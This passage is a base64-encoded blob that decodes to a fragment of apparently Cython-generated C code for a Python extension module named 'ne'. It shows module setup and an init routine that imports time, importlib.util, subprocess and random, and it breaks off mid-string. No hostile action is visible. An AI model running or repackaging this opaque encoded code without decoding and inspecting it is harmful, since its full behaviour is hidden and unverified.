WCA+PSAweDAzMEMwMDAwICYmIENZVEhPTl9VU0VfTU9EVUxFX1NUQVRFCiAge1B5X21vZF9tdWx0aXBsZV9pbnRlcnByZXRlcnMsIFB5X01PRF9NVUxUSVBMRV9JTlRFUlBSRVRFUlNfTk9UX1NVUFBPUlRFRH0sCiAgI2VuZGlmCiAgezAsIE5VTEx9Cn07CiNlbmRpZgoKI2lmZGVmIF9fY3BsdXNwbHVzCm5hbWVzcGFjZSB7CiAgc3RydWN0IFB5TW9kdWxlRGVmIF9fcHl4X21vZHVsZWRlZiA9CiAgI2Vsc2UKICBzdGF0aWMgc3RydWN0IFB5TW9kdWxlRGVmIF9fcHl4X21vZHVsZWRlZiA9CiAgI2VuZGlmCiAgewogICAgICBQeU1vZHVsZURlZl9IRUFEX0lOSVQsCiAgICAgICJuZSIsCiAgICAgIDAsIAogICAgI2lmIENZVEhPTl9VU0VfTU9EVUxFX1NUQVRFCiAgICAgIHNpemVvZihfX3B5eF9tc3RhdGV0eXBlKSwgCiAgICAjZWxzZQogICAgICAoQ1lUSE9OX1BFUDQ4OV9NVUxUSV9QSEFTRV9JTklUKSA/IDAgOiAtMSwgCiAgICAjZW5kaWYKICAgICAgX19weXhfbWV0aG9kcyAsCiAgICAjaWYgQ1lUSE9OX1BFUDQ4OV9NVUxUSV9QSEFTRV9JTklUCiAgICAgIF9fcHl4X21vZHVsZWRlZl9zbG90cywgCiAgICAjZWxzZQogICAgICBOVUxMLCAKICAgICNlbmRpZgogICAgI2lmIENZVEhPTl9VU0VfTU9EVUxFX1NUQVRFCiAgICAgIF9fcHl4X21fdHJhdmVyc2UsIAogICAgICBfX3B5eF9tX2NsZWFyLCAKICAgICAgTlVMTCAKICAgICNlbHNlCiAgICAgIE5VTEwsIAogICAgICBOVUxMLCAKICAgICAgTlVMTCAKICAgICNlbmRpZgogIH07CiAgI2lmZGVmIF9fY3BsdXNwbHVzCn0gCiNlbmRpZgoKCiNpZm5kZWYgQ1lUSE9OX05PX1BZSU5JVF9FWFBPUlQKICAjZGVmaW5lIF9fUHl4X1B5TU9ESU5JVF9GVU5DIFB5TU9ESU5JVF9GVU5DCiNlbHNlCiAgI2lmZGVmIF9fY3BsdXNwbHVzCiAgI2RlZmluZSBfX1B5eF9QeU1PRElOSVRfRlVOQyBleHRlcm4gIkMiIFB5T2JqZWN0ICoKICAjZWxzZQogICNkZWZpbmUgX19QeXhfUHlNT0RJTklUX0ZVTkMgUHlPYmplY3QgKgogICNlbmRpZgojZW5kaWYKCl9fUHl4X1B5TU9ESU5JVF9GVU5DIFB5SW5pdF9uZSh2b2lkKSBDWVRIT05fU01BTExfQ09ERTsgCl9fUHl4X1B5TU9ESU5JVF9GVU5DIFB5SW5pdF9uZSh2b2lkKQojaWYgQ1lUSE9OX1BFUDQ4OV9NVUxUSV9QSEFTRV9JTklUCnsKICByZXR1cm4gUHlNb2R1bGVEZWZfSW5pdCgmX19weXhfbW9kdWxlZGVmKTsKfQoKI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUEkgJiYgX19QWVhfTElNSVRFRF9WRVJTSU9OX0hFWCA8IDB4MDMwOTAwMDAKc3RhdGljIFBZX0lOVDY0X1QgX19QeXhfR2V0Q3VycmVudEludGVycHJldGVySWQodm9pZCkgewogICAgewogICAgICAgIFB5T2JqZWN0ICptb2R1bGUgPSBQeUltcG9ydF9JbXBvcnRNb2R1bGUoIl9pbnRlcnByZXRlcnMiKTsgLy8gMy4xMysgSSB0aGluawogICAgICAgIGlmICghbW9kdWxlKSB7CiAgICAgICAgICAgIFB5RXJyX0NsZWFyKCk7IC8vIGp1c3QgdHJ5IHRoZSAzLjgtMy4xMiB2ZXJzaW9uCiAgICAgICAgICAgIG1vZHVsZSA9IFB5SW1wb3J0X0ltcG9ydE1vZHVsZSgiX3h4c3ViaW50ZXJwcmV0ZXJzIik7CiAgICAgICAgICAgIGlmICghbW9kdWxlKSBnb3RvIGJhZDsKICAgICAgICB9CiAgICAgICAgUHlPYmplY3QgKmN1cnJlbnQgPSBQeU9iamVjdF9DYWxsTWV0aG9kKG1vZHVsZSwgImdldF9jdXJyZW50IiwgTlVMTCk7CiAgICAgICAgUHlfREVDUkVGKG1vZHVsZSk7CiAgICAgICAgaWYgKCFjdXJyZW50KSBnb3RvIGJhZDsKICAgICAgICBpZiAoUHlUdXBsZV9DaGVjayhjdXJyZW50KSkgewogICAgICAgICAgICBQeU9iamVjdCAqbmV3X2N1cnJlbnQgPSBQeVNlcXVlbmNlX0dldEl0ZW0oY3VycmVudCwgMCk7CiAgICAgICAgICAgIFB5X0RFQ1JFRihjdXJyZW50KTsKICAgICAgICAgICAgY3VycmVudCA9IG5ld19jdXJyZW50OwogICAgICAgICAgICBpZiAoIW5ld19jdXJyZW50KSBnb3RvIGJhZDsKICAgICAgICB9CiAgICAgICAgbG9uZyBsb25nIGFzX2NfaW50ID0gUHlMb25nX0FzTG9uZ0xvbmcoY3VycmVudCk7CiAgICAgICAgUHlfREVDUkVGKGN1cnJlbnQpOwogICAgICAgIHJldHVybiBhc19jX2ludDsKICAgIH0KICBiYWQ6CiAgICBQeVN5c19Xcml0ZVN0ZGVycigiX19QeXhfR2V0Q3VycmVudEludGVycHJldGVySWQgZmFpbGVkLiBUcnkgc2V0dGluZyB0aGUgQyBkZWZpbmUgQ1lUSE9OX1BFUDQ4OV9NVUxUSV9QSEFTRV9JTklUPTBcbiIpOwogICAgcmV0dXJuIC0xOwp9CiNlbmRpZgojaWYgIUNZVEhPTl9VU0VfTU9EVUxFX1NUQVRFCnN0YXRpYyBDWVRIT05fU01BTExfQ09ERSBpbnQgX19QeXhfY2hlY2tfc2luZ2xlX2ludGVycHJldGVyKHZvaWQpIHsKICAgIHN0YXRpYyBQWV9JTlQ2NF9UIG1haW5faW50ZXJwcmV0ZXJfaWQgPSAtMTsKI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fR1JBQUwKICAgIFBZX0lOVDY0X1QgY3VycmVudF9pZCA9IFB5SW50ZXJwcmV0ZXJTdGF0ZV9HZXRJREZyb21UaHJlYWRTdGF0ZShQeVRocmVhZFN0YXRlX0dldCgpKTsKI2VsaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSSAmJiBfX1BZWF9MSU1JVEVEX1ZFUlNJT05fSEVYID49IDB4MDMwOTAwMDAKICAgIFBZX0lOVDY0X1QgY3VycmVudF9pZCA9IFB5SW50ZXJwcmV0ZXJTdGF0ZV9HZXRJRChQeUludGVycHJldGVyU3RhdGVfR2V0KCkpOwojZWxpZiBDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJCiAgICBQWV9JTlQ2NF9UIGN1cnJlbnRfaWQgPSBfX1B5eF9HZXRDdXJyZW50SW50ZXJwcmV0ZXJJZCgpOwojZWxzZQogICAgUFlfSU5UNjRfVCBjdXJyZW50X2lkID0gUHlJbnRlcnByZXRlclN0YXRlX0dldElEKFB5VGhyZWFkU3RhdGVfR2V0KCktPmludGVycCk7CiNlbmRpZgogICAgaWYgKHVubGlrZWx5KGN1cnJlbnRfaWQgPT0gLTEpKSB7CiAgICAgICAgcmV0dXJuIC0xOwogICAgfQogICAgaWYgKG1haW5faW50ZXJwcmV0ZXJfaWQgPT0gLTEpIHsKICAgICAgICBtYWluX2ludGVycHJldGVyX2lkID0gY3VycmVudF9pZDsKICAgICAgICByZXR1cm4gMDsKICAgIH0gZWxzZSBpZiAodW5saWtlbHkobWFpbl9pbnRlcnByZXRlcl9pZCAhPSBjdXJyZW50X2lkKSkgewogICAgICAgIFB5RXJyX1NldFN0cmluZygKICAgICAgICAgICAgUHlFeGNfSW1wb3J0RXJyb3IsCiAgICAgICAgICAgICJJbnRlcnByZXRlciBjaGFuZ2UgZGV0ZWN0ZWQgLSB0aGlzIG1vZHVsZSBjYW4gb25seSBiZSBsb2FkZWQgaW50byBvbmUgaW50ZXJwcmV0ZXIgcGVyIHByb2Nlc3MuIik7CiAgICAgICAgcmV0dXJuIC0xOwogICAgfQogICAgcmV0dXJuIDA7Cn0KI2VuZGlmCnN0YXRpYyBDWVRIT05fU01BTExfQ09ERSBpbnQgX19QeXhfY29weV9zcGVjX3RvX21vZHVsZShQeU9iamVjdCAqc3BlYywgUHlPYmplY3QgKm1vZGRpY3QsIGNvbnN0IGNoYXIqIGZyb21fbmFtZSwgY29uc3QgY2hhciogdG9fbmFtZSwgaW50IGFsbG93X25vbmUpCnsKICAgIFB5T2JqZWN0ICp2YWx1ZSA9IFB5T2JqZWN0X0dldEF0dHJTdHJpbmcoc3BlYywgZnJvbV9uYW1lKTsKICAgIGludCByZXN1bHQgPSAwOwogICAgaWYgKGxpa2VseSh2YWx1ZSkpIHsKICAgICAgICBpZiAoYWxsb3dfbm9uZSB8fCB2YWx1ZSAhPSBQeV9Ob25lKSB7CiAgICAgICAgICAgIHJlc3VsdCA9IFB5RGljdF9TZXRJdGVtU3RyaW5nKG1vZGRpY3QsIHRvX25hbWUsIHZhbHVlKTsKICAgICAgICB9CiAgICAgICAgUHlfREVDUkVGKHZhbHVlKTsKICAgIH0gZWxzZSBpZiAoUHlFcnJfRXhjZXB0aW9uTWF0Y2hlcyhQeUV4Y19BdHRyaWJ1dGVFcnJvcikpIHsKICAgICAgICBQeUVycl9DbGVhcigpOwogICAgfSBlbHNlIHsKICAgICAgICByZXN1bHQgPSAtMTsKICAgIH0KICAgIHJldHVybiByZXN1bHQ7Cn0Kc3RhdGljIENZVEhPTl9TTUFMTF9DT0RFIFB5T2JqZWN0KiBfX3B5eF9weW1vZF9jcmVhdGUoUHlPYmplY3QgKnNwZWMsIFB5TW9kdWxlRGVmICpkZWYpIHsKICAgIFB5T2JqZWN0ICptb2R1bGUgPSBOVUxMLCAqbW9kZGljdCwgKm1vZG5hbWU7CiAgICBDWVRIT05fVU5VU0VEX1ZBUihkZWYpOwogICAgI2lmICFDWVRIT05fVVNFX01PRFVMRV9TVEFURQogICAgaWYgKF9fUHl4X2NoZWNrX3NpbmdsZV9pbnRlcnByZXRlcigpKQogICAgICAgIHJldHVybiBOVUxMOwogICAgI2VuZGlmCiAgICBpZiAoX19weXhfbSkKICAgICAgICByZXR1cm4gX19QeXhfTmV3UmVmKF9fcHl4X20pOwogICAgbW9kbmFtZSA9IFB5T2JqZWN0X0dldEF0dHJTdHJpbmcoc3BlYywgIm5hbWUiKTsKICAgIGlmICh1bmxpa2VseSghbW9kbmFtZSkpIGdvdG8gYmFkOwogICAgbW9kdWxlID0gUHlNb2R1bGVfTmV3T2JqZWN0KG1vZG5hbWUpOwogICAgUHlfREVDUkVGKG1vZG5hbWUpOwogICAgaWYgKHVubGlrZWx5KCFtb2R1bGUpKSBnb3RvIGJhZDsKICAgIG1vZGRpY3QgPSBQeU1vZHVsZV9HZXREaWN0KG1vZHVsZSk7CiAgICBpZiAodW5saWtlbHkoIW1vZGRpY3QpKSBnb3RvIGJhZDsKICAgIGlmICh1bmxpa2VseShfX1B5eF9jb3B5X3NwZWNfdG9fbW9kdWxlKHNwZWMsIG1vZGRpY3QsICJsb2FkZXIiLCAiX19sb2FkZXJfXyIsIDEpIDwgMCkpIGdvdG8gYmFkOwogICAgaWYgKHVubGlrZWx5KF9fUHl4X2NvcHlfc3BlY190b19tb2R1bGUoc3BlYywgbW9kZGljdCwgIm9yaWdpbiIsICJfX2ZpbGVfXyIsIDEpIDwgMCkpIGdvdG8gYmFkOwogICAgaWYgKHVubGlrZWx5KF9fUHl4X2NvcHlfc3BlY190b19tb2R1bGUoc3BlYywgbW9kZGljdCwgInBhcmVudCIsICJfX3BhY2thZ2VfXyIsIDEpIDwgMCkpIGdvdG8gYmFkOwogICAgaWYgKHVubGlrZWx5KF9fUHl4X2NvcHlfc3BlY190b19tb2R1bGUoc3BlYywgbW9kZGljdCwgInN1Ym1vZHVsZV9zZWFyY2hfbG9jYXRpb25zIiwgIl9fcGF0aF9fIiwgMCkgPCAwKSkgZ290byBiYWQ7CiAgICByZXR1cm4gbW9kdWxlOwpiYWQ6CiAgICBQeV9YREVDUkVGKG1vZHVsZSk7CiAgICByZXR1cm4gTlVMTDsKfQoKCnN0YXRpYyBDWVRIT05fU01BTExfQ09ERSBpbnQgX19weXhfcHltb2RfZXhlY19uZShQeU9iamVjdCAqX19weXhfcHlpbml0X21vZHVsZSkKI2VuZGlmCnsKICBpbnQgc3RyaW5ndGFiX2luaXRpYWxpemVkID0gMDsKICAjaWYgQ1lUSE9OX1VTRV9NT0RVTEVfU1RBVEUKICBpbnQgcHlzdGF0ZV9hZGRtb2R1bGVfcnVuID0gMDsKICAjZW5kaWYKICBfX3B5eF9tc3RhdGV0eXBlICpfX3B5eF9tc3RhdGUgPSBOVUxMOwogIFB5T2JqZWN0ICpfX3B5eF90XzEgPSBOVUxMOwogIFB5T2JqZWN0ICpfX3B5eF90XzIgPSBOVUxMOwogIFB5T2JqZWN0ICpfX3B5eF90XzMgPSBOVUxMOwogIFB5T2JqZWN0ICpfX3B5eF90XzQgPSBOVUxMOwogIFB5T2JqZWN0ICpfX3B5eF90XzUgPSBOVUxMOwogIHNpemVfdCBfX3B5eF90XzY7CiAgUHlPYmplY3QgKl9fcHl4X3RfNyA9IE5VTEw7CiAgUHlPYmplY3QgKl9fcHl4X3RfOCA9IE5VTEw7CiAgUHlPYmplY3QgKl9fcHl4X3RfOSA9IE5VTEw7CiAgUHlPYmplY3QgKl9fcHl4X3RfMTAgPSBOVUxMOwogIFB5T2JqZWN0ICpfX3B5eF90XzExID0gTlVMTDsKICBQeU9iamVjdCAqX19weXhfdF8xMlszXTsKICBpbnQgX19weXhfbGluZW5vID0gMDsKICBjb25zdCBjaGFyICpfX3B5eF9maWxlbmFtZSA9IE5VTEw7CiAgaW50IF9fcHl4X2NsaW5lbm8gPSAwOwogIF9fUHl4X1JlZk5hbm55RGVjbGFyYXRpb25zCiAgI2lmIENZVEhPTl9QRVA0ODlfTVVMVElfUEhBU0VfSU5JVAogIGlmIChfX3B5eF9tKSB7CiAgICBpZiAoX19weXhfbSA9PSBfX3B5eF9weWluaXRfbW9kdWxlKSByZXR1cm4gMDsKICAgIFB5RXJyX1NldFN0cmluZyhQeUV4Y19SdW50aW1lRXJyb3IsICJNb2R1bGUgJ25lJyBoYXMgYWxyZWFkeSBiZWVuIGltcG9ydGVkLiBSZS1pbml0aWFsaXNhdGlvbiBpcyBub3Qgc3VwcG9ydGVkLiIpOwogICAgcmV0dXJuIC0xOwogIH0KICAjZWxzZQogIGlmIChfX3B5eF9tKSByZXR1cm4gX19QeXhfTmV3UmVmKF9fcHl4X20pOwogICNlbmRpZgogIAogICNpZiBDWVRIT05fUEVQNDg5X01VTFRJX1BIQVNFX0lOSVQKICBfX3B5eF90XzEgPSBfX3B5eF9weWluaXRfbW9kdWxlOwogIFB5X0lOQ1JFRihfX3B5eF90XzEpOwogICNlbHNlCiAgX19weXhfdF8xID0gUHlNb2R1bGVfQ3JlYXRlKCZfX3B5eF9tb2R1bGVkZWYpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMSkpIF9fUFlYX0VSUigwLCAxLCBfX3B5eF9MMV9lcnJvcikKICAjZW5kaWYKICAjaWYgQ1lUSE9OX1VTRV9NT0RVTEVfU1RBVEUKICB7CiAgICBpbnQgYWRkX21vZHVsZV9yZXN1bHQgPSBfX1B5eF9TdGF0ZV9BZGRNb2R1bGUoX19weXhfdF8xLCAmX19weXhfbW9kdWxlZGVmKTsKICAgIF9fcHl4X3RfMSA9IDA7IAogICAgaWYgKHVubGlrZWx5KChhZGRfbW9kdWxlX3Jlc3VsdCA8IDApKSkgX19QWVhfRVJSKDAsIDEsIF9fcHl4X0wxX2Vycm9yKQogICAgcHlzdGF0ZV9hZGRtb2R1bGVfcnVuID0gMTsKICB9CiAgI2Vsc2UKICBfX3B5eF9tID0gX19weXhfdF8xOwogICNlbmRpZgogICNpZiBDWVRIT05fQ09NUElMSU5HX0lOX0NQWVRIT05fRlJFRVRIUkVBRElORwogIFB5VW5zdGFibGVfTW9kdWxlX1NldEdJTChfX3B5eF9tLCBQeV9NT0RfR0lMX1VTRUQpOwogICNlbmRpZgogIF9fcHl4X21zdGF0ZSA9IF9fcHl4X21zdGF0ZV9nbG9iYWw7CiAgQ1lUSE9OX1VOVVNFRF9WQVIoX19weXhfdF8xKTsKICBfX3B5eF9tc3RhdGUtPl9fcHl4X2QgPSBQeU1vZHVsZV9HZXREaWN0KF9fcHl4X20pOyBpZiAodW5saWtlbHkoIV9fcHl4X21zdGF0ZS0+X19weXhfZCkpIF9fUFlYX0VSUigwLCAxLCBfX3B5eF9MMV9lcnJvcikKICBQeV9JTkNSRUYoX19weXhfbXN0YXRlLT5fX3B5eF9kKTsKICBfX3B5eF9tc3RhdGUtPl9fcHl4X2IgPSBfX1B5eF9QeUltcG9ydF9BZGRNb2R1bGVSZWYoX19QeXhfQlVJTFRJTl9NT0RVTEVfTkFNRSk7IGlmICh1bmxpa2VseSghX19weXhfbXN0YXRlLT5fX3B5eF9iKSkgX19QWVhfRVJSKDAsIDEsIF9fcHl4X0wxX2Vycm9yKQogIF9fcHl4X21zdGF0ZS0+X19weXhfY3l0aG9uX3J1bnRpbWUgPSBfX1B5eF9QeUltcG9ydF9BZGRNb2R1bGVSZWYoImN5dGhvbl9ydW50aW1lIik7IGlmICh1bmxpa2VseSghX19weXhfbXN0YXRlLT5fX3B5eF9jeXRob25fcnVudGltZSkpIF9fUFlYX0VSUigwLCAxLCBfX3B5eF9MMV9lcnJvcikKICBpZiAoUHlPYmplY3RfU2V0QXR0clN0cmluZyhfX3B5eF9tLCAiX19idWlsdGluc19fIiwgX19weXhfbXN0YXRlLT5fX3B5eF9iKSA8IDApIF9fUFlYX0VSUigwLCAxLCBfX3B5eF9MMV9lcnJvcikKICAKICAjaWYgQ1lUSE9OX1JFRk5BTk5ZCl9fUHl4X1JlZk5hbm55ID0gX19QeXhfUmVmTmFubnlJbXBvcnRBUEkoInJlZm5hbm55Iik7CmlmICghX19QeXhfUmVmTmFubnkpIHsKICBQeUVycl9DbGVhcigpOwogIF9fUHl4X1JlZk5hbm55ID0gX19QeXhfUmVmTmFubnlJbXBvcnRBUEkoIkN5dGhvbi5SdW50aW1lLnJlZm5hbm55Iik7CiAgaWYgKCFfX1B5eF9SZWZOYW5ueSkKICAgICAgUHlfRmF0YWxFcnJvcigiZmFpbGVkIHRvIGltcG9ydCAncmVmbmFubnknIG1vZHVsZSIpOwp9CiNlbmRpZgoKX19QeXhfUmVmTmFubnlTZXR1cENvbnRleHQoIlB5SW5pdF9uZSIsIDApOwogIGlmIChfX1B5eF9jaGVja19iaW5hcnlfdmVyc2lvbihfX1BZWF9MSU1JVEVEX1ZFUlNJT05fSEVYLCBfX1B5eF9nZXRfcnVudGltZV92ZXJzaW9uKCksIENZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUEkpIDwgKDApKSBfX1BZWF9FUlIoMCwgMSwgX19weXhfTDFfZXJyb3IpCiAgI2lmZGVmIF9fUHh5X1B5RnJhbWVfSW5pdGlhbGl6ZV9PZmZzZXRzCiAgX19QeHlfUHlGcmFtZV9Jbml0aWFsaXplX09mZnNldHMoKTsKICAjZW5kaWYKICBfX3B5eF9tc3RhdGUtPl9fcHl4X2VtcHR5X3R1cGxlID0gUHlUdXBsZV9OZXcoMCk7IGlmICh1bmxpa2VseSghX19weXhfbXN0YXRlLT5fX3B5eF9lbXB0eV90dXBsZSkpIF9fUFlYX0VSUigwLCAxLCBfX3B5eF9MMV9lcnJvcikKICBfX3B5eF9tc3RhdGUtPl9fcHl4X2VtcHR5X2J5dGVzID0gUHlCeXRlc19Gcm9tU3RyaW5nQW5kU2l6ZSgiIiwgMCk7IGlmICh1bmxpa2VseSghX19weXhfbXN0YXRlLT5fX3B5eF9lbXB0eV9ieXRlcykpIF9fUFlYX0VSUigwLCAxLCBfX3B5eF9MMV9lcnJvcikKICBfX3B5eF9tc3RhdGUtPl9fcHl4X2VtcHR5X3VuaWNvZGUgPSBQeVVuaWNvZGVfRnJvbVN0cmluZ0FuZFNpemUoIiIsIDApOyBpZiAodW5saWtlbHkoIV9fcHl4X21zdGF0ZS0+X19weXhfZW1wdHlfdW5pY29kZSkpIF9fUFlYX0VSUigwLCAxLCBfX3B5eF9MMV9lcnJvcikKICAKICBpZiAoX19QeXhfSW5pdENvbnN0YW50cyhfX3B5eF9tc3RhdGUpIDwgKDApKSBfX1BZWF9FUlIoMCwgMSwgX19weXhfTDFfZXJyb3IpCiAgc3RyaW5ndGFiX2luaXRpYWxpemVkID0gMTsKICBpZiAoX19QeXhfSW5pdEdsb2JhbHMoKSA8ICgwKSkgX19QWVhfRVJSKDAsIDEsIF9fcHl4X0wxX2Vycm9yKQogICNpZiAwIHx8IGRlZmluZWQoX19QeXhfQ3lGdW5jdGlvbl9VU0VEKSB8fCBkZWZpbmVkKF9fUHl4X0Z1c2VkRnVuY3Rpb25fVVNFRCkgfHwgZGVmaW5lZChfX1B5eF9Db3JvdXRpbmVfVVNFRCkgfHwgZGVmaW5lZChfX1B5eF9HZW5lcmF0b3JfVVNFRCkgfHwgZGVmaW5lZChfX1B5eF9Bc3luY0dlbl9VU0VEKQogIGlmIChfX3B5eF9Db21tb25UeXBlc01ldGFjbGFzc19pbml0KF9fcHl4X20pIDwgKDApKSBfX1BZWF9FUlIoMCwgMSwgX19weXhfTDFfZXJyb3IpCiAgI2VuZGlmCiAgI2lmZGVmIF9fUHl4X0N5RnVuY3Rpb25fVVNFRAogIGlmIChfX3B5eF9DeUZ1bmN0aW9uX2luaXQoX19weXhfbSkgPCAoMCkpIF9fUFlYX0VSUigwLCAxLCBfX3B5eF9MMV9lcnJvcikKICAjZW5kaWYKICAjaWZkZWYgX19QeXhfRnVzZWRGdW5jdGlvbl9VU0VECiAgaWYgKF9fcHl4X0Z1c2VkRnVuY3Rpb25faW5pdChfX3B5eF9tKSA8ICgwKSkgX19QWVhfRVJSKDAsIDEsIF9fcHl4X0wxX2Vycm9yKQogICNlbmRpZgogICNpZmRlZiBfX1B5eF9Db3JvdXRpbmVfVVNFRAogIGlmIChfX3B5eF9Db3JvdXRpbmVfaW5pdChfX3B5eF9tKSA8ICgwKSkgX19QWVhfRVJSKDAsIDEsIF9fcHl4X0wxX2Vycm9yKQogICNlbmRpZgogICNpZmRlZiBfX1B5eF9HZW5lcmF0b3JfVVNFRAogIGlmIChfX3B5eF9HZW5lcmF0b3JfaW5pdChfX3B5eF9tKSA8ICgwKSkgX19QWVhfRVJSKDAsIDEsIF9fcHl4X0wxX2Vycm9yKQogICNlbmRpZgogICNpZmRlZiBfX1B5eF9Bc3luY0dlbl9VU0VECiAgaWYgKF9fcHl4X0FzeW5jR2VuX2luaXQoX19weXhfbSkgPCAoMCkpIF9fUFlYX0VSUigwLCAxLCBfX3B5eF9MMV9lcnJvcikKICAjZW5kaWYKICAKICBpZiAoX19weXhfbW9kdWxlX2lzX21haW5fbmUpIHsKICAgIGlmIChQeU9iamVjdF9TZXRBdHRyKF9fcHl4X20sIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9uYW1lXzIsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9tYWluKSA8ICgwKSkgX19QWVhfRVJSKDAsIDEsIF9fcHl4X0wxX2Vycm9yKQogIH0KICB7CiAgICBQeU9iamVjdCAqbW9kdWxlcyA9IFB5SW1wb3J0X0dldE1vZHVsZURpY3QoKTsgaWYgKHVubGlrZWx5KCFtb2R1bGVzKSkgX19QWVhfRVJSKDAsIDEsIF9fcHl4X0wxX2Vycm9yKQogICAgaWYgKCFQeURpY3RfR2V0SXRlbVN0cmluZyhtb2R1bGVzLCAibmUiKSkgewogICAgICBpZiAodW5saWtlbHkoKFB5RGljdF9TZXRJdGVtU3RyaW5nKG1vZHVsZXMsICJuZSIsIF9fcHl4X20pIDwgMCkpKSBfX1BZWF9FUlIoMCwgMSwgX19weXhfTDFfZXJyb3IpCiAgICB9CiAgfQogIAogIGlmIChfX1B5eF9Jbml0Q2FjaGVkQnVpbHRpbnMoX19weXhfbXN0YXRlKSA8ICgwKSkgX19QWVhfRVJSKDAsIDEsIF9fcHl4X0wxX2Vycm9yKQogIAogIGlmIChfX1B5eF9Jbml0Q2FjaGVkQ29uc3RhbnRzKF9fcHl4X21zdGF0ZSkgPCAoMCkpIF9fUFlYX0VSUigwLCAxLCBfX3B5eF9MMV9lcnJvcikKICBpZiAoX19QeXhfQ3JlYXRlQ29kZU9iamVjdHMoX19weXhfbXN0YXRlKSA8ICgwKSkgX19QWVhfRVJSKDAsIDEsIF9fcHl4X0wxX2Vycm9yKQogIAogICh2b2lkKV9fUHl4X21vZGluaXRfZ2xvYmFsX2luaXRfY29kZShfX3B5eF9tc3RhdGUpOwogICh2b2lkKV9fUHl4X21vZGluaXRfdmFyaWFibGVfZXhwb3J0X2NvZGUoX19weXhfbXN0YXRlKTsKICAodm9pZClfX1B5eF9tb2Rpbml0X2Z1bmN0aW9uX2V4cG9ydF9jb2RlKF9fcHl4X21zdGF0ZSk7CiAgaWYgKHVubGlrZWx5KChfX1B5eF9tb2Rpbml0X3R5cGVfaW5pdF9jb2RlKF9fcHl4X21zdGF0ZSkgPCAwKSkpIF9fUFlYX0VSUigwLCAxLCBfX3B5eF9MMV9lcnJvcikKICAodm9pZClfX1B5eF9tb2Rpbml0X3R5cGVfaW1wb3J0X2NvZGUoX19weXhfbXN0YXRlKTsKICAodm9pZClfX1B5eF9tb2Rpbml0X3ZhcmlhYmxlX2ltcG9ydF9jb2RlKF9fcHl4X21zdGF0ZSk7CiAgKHZvaWQpX19QeXhfbW9kaW5pdF9mdW5jdGlvbl9pbXBvcnRfY29kZShfX3B5eF9tc3RhdGUpOwogIAoKICAKICBfX3B5eF90XzIgPSBfX1B5eF9JbXBvcnREb3R0ZWRNb2R1bGUoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3RpbWUsIE5VTEwpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMikpIF9fUFlYX0VSUigwLCAyLCBfX3B5eF9MMV9lcnJvcikKICBfX1B5eF9HT1RSRUYoX19weXhfdF8yKTsKICBpZiAoUHlEaWN0X1NldEl0ZW0oX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3RpbWUsIF9fcHl4X3RfMikgPCAoMCkpIF9fUFlYX0VSUigwLCAyLCBfX3B5eF9MMV9lcnJvcikKICBfX1B5eF9ERUNSRUYoX19weXhfdF8yKTsgX19weXhfdF8yID0gMDsKCiAgCiAgX19weXhfdF8yID0gX19QeXhfSW1wb3J0KF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9pbXBvcnRsaWJfdXRpbCwgMCwgMCk7IGlmICh1bmxpa2VseSghX19weXhfdF8yKSkgX19QWVhfRVJSKDAsIDMsIF9fcHl4X0wxX2Vycm9yKQogIF9fUHl4X0dPVFJFRihfX3B5eF90XzIpOwogIGlmIChQeURpY3RfU2V0SXRlbShfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9kLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfaW1wb3J0bGliLCBfX3B5eF90XzIpIDwgKDApKSBfX1BZWF9FUlIoMCwgMywgX19weXhfTDFfZXJyb3IpCiAgX19QeXhfREVDUkVGKF9fcHl4X3RfMik7IF9fcHl4X3RfMiA9IDA7CgogIAogIF9fcHl4X3RfMiA9IF9fUHl4X0ltcG9ydERvdHRlZE1vZHVsZShfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3Vfc3VicHJvY2VzcywgTlVMTCk7IGlmICh1bmxpa2VseSghX19weXhfdF8yKSkgX19QWVhfRVJSKDAsIDQsIF9fcHl4X0wxX2Vycm9yKQogIF9fUHl4X0dPVFJFRihfX3B5eF90XzIpOwogIGlmIChQeURpY3RfU2V0SXRlbShfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9kLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3Vfc3VicHJvY2VzcywgX19weXhfdF8yKSA8ICgwKSkgX19QWVhfRVJSKDAsIDQsIF9fcHl4X0wxX2Vycm9yKQogIF9fUHl4X0RFQ1JFRihfX3B5eF90XzIpOyBfX3B5eF90XzIgPSAwOwoKICAKICBfX3B5eF90XzIgPSBfX1B5eF9QeUxpc3RfUGFjaygxLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfcmFuZHJhbmdlKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzIpKSBfX1BZWF9FUlIoMCwgNSwgX19weXhfTDFfZXJyb3IpCiAgX19QeXhfR09UUkVGKF9fcHl4X3RfMik7CiAgX19weXhfdF8zID0gX19QeXhfSW1wb3J0KF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9yYW5kb20sIF9fcHl4X3RfMiwgMCk7IGlmICh1bmxpa2VseSghX19weXhfdF8zKSkgX19QWVhfRVJSKDAsIDUsIF9fcHl4X0wxX2Vycm9yKQogIF9fUHl4X0dPVFJFRihfX3B5eF90XzMpOwogIF9fUHl4X0RFQ1JFRihfX3B5eF90XzIpOyBfX3B5eF90XzIgPSAwOwogIF9fcHl4X3RfMiA9IF9fUHl4X0ltcG9ydEZyb20oX19weXhfdF8zLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfcmFuZHJhbmdlKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzIpKSBf